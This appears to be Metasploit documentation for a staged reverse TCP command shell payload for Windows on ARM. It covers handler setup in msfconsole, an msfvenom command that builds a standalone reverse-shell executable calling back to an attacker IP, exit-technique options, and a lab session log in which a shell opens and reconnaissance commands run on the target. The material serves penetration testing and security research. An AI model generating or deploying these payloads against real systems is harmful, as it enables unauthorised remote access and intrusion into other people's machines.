## Vulnerable Application

This is a staged reverse TCP command shell for Windows on ARM (AArch64).
It targets native AArch64 Windows processes (Windows on ARM), not x86/x64
emulation.

Compatible environments include:

* Windows 11 on ARM (native AArch64)
* Windows 10 on ARM (native AArch64)

There is no specific vulnerable application -- this is a payload module
used with a compatible exploit or generated as a standalone executable
via `msfvenom`.

## Verification Steps

1. Start msfconsole
1. Do: `use exploit/multi/handler`
1. Do: `set PAYLOAD windows/aarch64/shell/reverse_tcp`
1. Do: `set LHOST [attacker IP]`
1. Do: `set LPORT 4444`
1. Do: `run`
1. On a Windows on ARM target, execute a PE generated with:
   `./msfvenom -p windows/aarch64/shell/reverse_tcp LHOST=[attacker IP] LPORT=4444 -f exe -o staged.exe`
1. You should get a Windows command shell session

## Options

### EXITFUNC

Exit technique used after the stage spawns `cmd.exe`. Accepted values:
`process`, `thread`, `none`, `seh`. (Default: `process`)

`seh` clears the unhandled exception filter via
`SetUnhandledExceptionFilter(NULL)` and then branches to address 0 for a
predictable crash (same tactic as the x86/x64 Windows payloads).

## Scenarios

### Windows 11 on ARM (UTM VM) -- staged reverse TCP

Attacker host: macOS at `192.168.0.164`. Target: Windows 11 ARM64
build `10.0.26200.8875` in a UTM VM.

```
$ ./msfvenom -p windows/aarch64/shell/reverse_tcp \
             LHOST=192.168.0.164 LPORT=6666 \
             -f exe -o test.exe
[*] Payload size: 716 bytes
[*] Final size of exe file: 6656 bytes
[*] Saved as: test.exe

$ ./msfconsole -qx "use exploit/multi/handler; \
                    set PAYLOAD windows/aarch64/shell/reverse_tcp; \
                    set LHOST 192.168.0.164; set LPORT 6666; run"
[*] Started reverse TCP handler on 192.168.0.164:6666
[*] Sending stage (420 bytes) to 192.168.0.164
[*] Command shell session 1 opened (192.168.0.164:6666 -> 192.168.0.164:50013)

Shell Banner:
Microsoft Windows [Version 10.0.26200.8875]
-----

C:\Users\user\Downloads>whoami
windows\user

C:\Users\user\Downloads>hostname
Windows

C:\Users\user\Downloads>ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address. . . . . . . . . . . : 10.0.2.15
```
